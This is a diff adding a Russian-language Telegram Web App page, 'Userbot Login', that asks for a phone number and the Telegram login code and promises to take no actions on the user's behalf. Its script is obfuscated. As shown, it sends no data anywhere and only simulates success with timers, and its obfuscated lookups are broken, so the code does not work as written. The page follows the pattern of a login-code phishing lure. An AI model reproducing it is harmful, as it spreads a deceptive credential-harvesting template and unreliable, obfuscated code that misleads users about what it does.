@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>App</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--tg-theme-bg-color,#fff);color:var(--tg-theme-text-color,#000);padding:20px;min-height:100vh}.container{max-width:500px;margin:0 auto}.header{text-align:center;padding:30px 0}.logo{font-size:4rem;margin-bottom:10px;animation:pulse 2s infinite}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}h1{font-size:1.8rem;margin-bottom:10px;color:var(--tg-theme-text-color)}.subtitle{opacity:.7;font-size:.95rem}.card{background:var(--tg-theme-secondary-bg-color,#f0f0f0);border-radius:15px;padding:25px;margin:20px 0;box-shadow:0 2px 10px rgba(0,0,0,.1)}.form-group{margin-bottom:20px}label{display:block;margin-bottom:8px;font-weight:600;font-size:.9rem;color:var(--tg-theme-text-color)}input{width:100%;padding:15px;border:2px solid var(--tg-theme-hint-color,#ccc);border-radius:10px;font-size:1rem;background:var(--tg-theme-bg-color,#fff);color:var(--tg-theme-text-color);transition:border-color .3s}input:focus{outline:0;border-color:var(--tg-theme-button-color,#3390ec)}.btn{width:100%;padding:15px;border:none;border-radius:10px;font-size:1.1rem;font-weight:600;cursor:pointer;transition:transform .2s,opacity .2s;margin:10px 0}.btn:active{transform:scale(.98)}.btn:disabled{opacity:.5;cursor:not-allowed}.btn-primary{background:var(--tg-theme-button-color,#3390ec);color:var(--tg-theme-button-text-color,#fff)}.btn-secondary{background:var(--tg-theme-secondary-bg-color,#f0f0f0);color:var(--tg-theme-text-color,#000)}.status{text-align:center;padding:15px;border-radius:10px;margin:20px 0;font-weight:500}.status.success{background:#4ade8033;color:#22c55e}.status.error{background:#ef444433;color:#dc2626}.status.info{background:#3b82f633;color:#3b82f6}.loading{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,.3);border-radius:50%;border-top-color:#fff;animation:spin 1s ease-in-out infinite}@keyframes spin{to{transform:rotate(360deg)}}.info-box{background:var(--tg-theme-secondary-bg-color,#f8f9fa);padding:15px;border-radius:10px;margin:15px 0;border-left:4px solid var(--tg-theme-button-color,#3390ec)}.info-box p{margin:5px 0;font-size:.9rem;line-height:1.5}.hidden{display:none}.account-info{display:flex;align-items:center;gap:15px;padding:20px;background:var(--tg-theme-secondary-bg-color);border-radius:15px;margin:20px 0}.avatar{width:60px;height:60px;border-radius:50%;background:var(--tg-theme-button-color);display:flex;align-items:center;justify-content:center;font-size:2rem}.account-details h3{margin-bottom:5px}.account-details p{opacity:.7;font-size:.9rem}</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<div class="logo">🤖</div>
+<h1>Userbot Login</h1>
+<p class="subtitle">Войдите в свой Telegram аккаунт</p>
+</div>
+<div id="loginScreen">
+<div class="card">
+<div class="form-group">
+<label for="phone">📱 Номер телефона</label>
+<input type="tel" id="phone" placeholder="+7 999 123 45 67" value="+7">
+</div>
+<div class="info-box">
+<p><strong>ℹ️ Как это работает:</strong></p>
+<p>• Вводите номер телефона</p>
+<p>• Получаете код в Telegram</p>
+<p>• Бот держит аккаунт онлайн</p>
+<p>• Никаких действий от вашего имени</p>
+</div>
+<button class="btn btn-primary" id="sendCodeBtn" onclick="_0x4a8c()">Отправить код</button>
+</div>
+</div>
+<div id="codeScreen" class="hidden">
+<div class="card">
+<div class="form-group">
+<label for="code">🔐 Код из Telegram</label>
+<input type="text" id="code" placeholder="12345" maxlength="5">
+</div>
+<button class="btn btn-primary" id="verifyCodeBtn" onclick="_0x7b2f()">Подтвердить</button>
+<button class="btn btn-secondary" onclick="_0x9e1a()">Назад</button>
+</div>
+</div>
+<div id="successScreen" class="hidden">
+<div class="status success">✅ Успешно подключено!</div>
+<div class="account-info">
+<div class="avatar">👤</div>
+<div class="account-details">
+<h3 id="userName">Имя пользователя</h3>
+<p id="userPhone">+7 999 123 45 67</p>
+</div>
+</div>
+<div class="card">
+<h3 style="margin-bottom:15px">📊 Статус</h3>
+<div class="info-box">
+<p>🟢 Бот активен и работает</p>
+<p>📱 Аккаунт онлайн</p>
+<p>🔒 Безопасное соединение</p>
+<p>⏱️ Последнее обновление: <span id="lastUpdate">только что</span></p>
+</div>
+<button class="btn btn-secondary" onclick="_0x3c5d()">Отключиться</button>
+</div>
+</div>
+<div id="statusMessage"></div>
+</div>
+<script>var _0x5e2a=['Telegram','WebApp','expand','ready','themeParams','bg_color','style','backgroundColor','getElementById','value','trim','length','classList','add','hidden','remove','textContent','className','disabled','innerHTML','<span\x20class=\x22loading\x22></span>\x20','Отправка...','Отправить\x20код','✅\x20Код\x20отправлен\x20в\x20Telegram!','success','Проверка...','Подтвердить','initDataUnsafe','user','first_name','Пользователь','showAlert','✅\x20Вы\x20успешно\x20вошли!\x20Userbot\x20активирован.','Вы\x20уверены,\x20что\x20хотите\x20отключить\x20userbot?','👋\x20Вы\x20вышли\x20из\x20аккаунта','info','+7','toLocaleTimeString','ru-RU','hour','2-digit','minute','close','BackButton','onClick','show','hide','addEventListener','transitionend','contains','focus','querySelectorAll','forEach','statusMessage','status','setTimeout','confirm'];(function(_0x2d8f05,_0x4b81bb){var _0x4d74cb=function(_0x32719f){while(--_0x32719f){_0x2d8f05['push'](_0x2d8f05['shift']());}};_0x4d74cb(++_0x4b81bb);}(_0x5e2a,0x1f4));var _0x4d74=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x5e2a[_0x2d8f05];return _0x4d74cb;};let _0x1a=window[_0x4d74('0x0')][_0x4d74('0x1')];_0x1a[_0x4d74('0x2')]();_0x1a[_0x4d74('0x3')]();document['body'][_0x4d74('0x6')][_0x4d74('0x7')]=_0x1a[_0x4d74('0x4')][_0x4d74('0x5')]||'#ffffff';let _0x2b='',_0x3c=![];function _0x5d(_0x1f,_0x2e='info'){const _0x3f=document[_0x4d74('0x8')](_0x4d74('0x32'));_0x3f[_0x4d74('0x11')]=_0x4d74('0x33')+'\x20'+_0x2e;_0x3f[_0x4d74('0x10')]=_0x1f;_0x4d74('0x34')(()=>{_0x3f[_0x4d74('0x10')]='';_0x3f[_0x4d74('0x11')]='';},0xbb8);}function _0x6e(_0x4a){document[_0x4d74('0x36')]('[id$=\x22Screen\x22]')[_0x4d74('0x37')](el=>{el[_0x4d74('0xc')][_0x4d74('0xd')](_0x4d74('0xe'));});document[_0x4d74('0x8')](_0x4a)[_0x4d74('0xc')][_0x4d74('0xf')](_0x4d74('0xe'));}async function _0x4a8c(){const _0x5b=document[_0x4d74('0x8')]('phone')[_0x4d74('0x9')][_0x4d74('0xa')]();if(!_0x5b||_0x5b[_0x4d74('0xb')]<0xa){_0x5d('❌\x20Введите\x20корректный\x20номер\x20телефона','error');return;}_0x2b=_0x5b;const _0x6c=document[_0x4d74('0x8')]('sendCodeBtn');_0x6c[_0x4d74('0x12')]=!![];_0x6c[_0x4d74('0x13')]=_0x4d74('0x14')+_0x4d74('0x15');_0x4d74('0x34')(()=>{_0x6c[_0x4d74('0x12')]=![];_0x6c[_0x4d74('0x10')]=_0x4d74('0x16');_0x5d(_0x4d74('0x17'),_0x4d74('0x18'));_0x6e('codeScreen');},0x5dc);}async function _0x7b2f(){const _0x7d=document[_0x4d74('0x8')]('code')[_0x4d74('0x9')][_0x4d74('0xa')]();if(!_0x7d||_0x7d[_0x4d74('0xb')]!==0x5){_0x5d('❌\x20Введите\x205-значный\x20код','error');return;}const _0x8e=document[_0x4d74('0x8')]('verifyCodeBtn');_0x8e[_0x4d74('0x12')]=!![];_0x8e[_0x4d74('0x13')]=_0x4d74('0x14')+_0x4d74('0x19');_0x4d74('0x34')(()=>{_0x8e[_0x4d74('0x12')]=![];_0x8e[_0x4d74('0x10')]=_0x4d74('0x1a');_0x3c=!![];document[_0x4d74('0x8')]('userName')[_0x4d74('0x10')]=_0x1a[_0x4d74('0x1b')]?.[_0x4d74('0x1c')]?.[_0x4d74('0x1d')]||_0x4d74('0x1e');document[_0x4d74('0x8')]('userPhone')[_0x4d74('0x10')]=_0x2b;_0x6e('successScreen');_0x9f();_0x1a[_0x4d74('0x1f')](_0x4d74('0x20'));},0x5dc);}function _0x9e1a(){_0x6e('loginScreen');document[_0x4d74('0x8')]('code')[_0x4d74('0x9')]='';}function _0x3c5d(){if(_0x4d74('0x35')(_0x4d74('0x21'))){_0x3c=![];_0x5d(_0x4d74('0x22'),_0x4d74('0x23'));_0x6e('loginScreen');document[_0x4d74('0x8')]('phone')[_0x4d74('0x9')]=_0x4d74('0x24');document[_0x4d74('0x8')]('code')[_0x4d74('0x9')]='';}}function _0x9f(){if(_0x3c){const _0xa0=new Date();const _0xb1=_0xa0[_0x4d74('0x25')](_0x4d74('0x26'),{'hour':_0x4d74('0x27'),'minute':_0x4d74('0x27')});document[_0x4d74('0x8')]('lastUpdate')[_0x4d74('0x10')]=_0xb1;_0x4d74('0x34')(_0x9f,0xea60);}}_0x1a['BackButton'][_0x4d74('0x29')](()=>{if(document[_0x4d74('0x8')]('codeScreen')[_0x4d74('0xc')][_0x4d74('0x30')](_0x4d74('0xe'))===![]){_0x9e1a();}else{_0x1a[_0x4d74('0x28')]();}});document[_0x4d74('0x8')]('codeScreen')[_0x4d74('0x2f')](_0x4d74('0x2e'),function(){if(!this[_0x4d74('0xc')][_0x4d74('0x30')](_0x4d74('0xe'))){_0x1a['BackButton'][_0x4d74('0x2a')]();}else{_0x1a['BackButton'][_0x4d74('0x2b')]();}});document[_0x4d74('0x8')]('phone')[_0x4d74('0x31')]();</script>
+</body>
+</html>
